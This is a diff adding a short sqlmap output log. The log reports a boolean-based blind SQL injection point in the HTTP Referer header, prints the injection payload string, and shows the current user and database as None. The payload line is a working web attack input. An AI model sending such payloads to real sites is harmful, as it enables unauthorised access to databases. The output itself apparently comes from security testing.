@@ -1,0 +1,13 @@
+sqlmap identified the following injection points with a total of 24172 HTTP(s) requests:
+---
+Place: Referer
+Parameter: Referer
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (Generic comment)
+    Payload: -6375"))) OR NOT 8379=8379-- AND ((("UQsU" LIKE "UQsU
+---
+
+current user:	None
+
+current database:	None
+
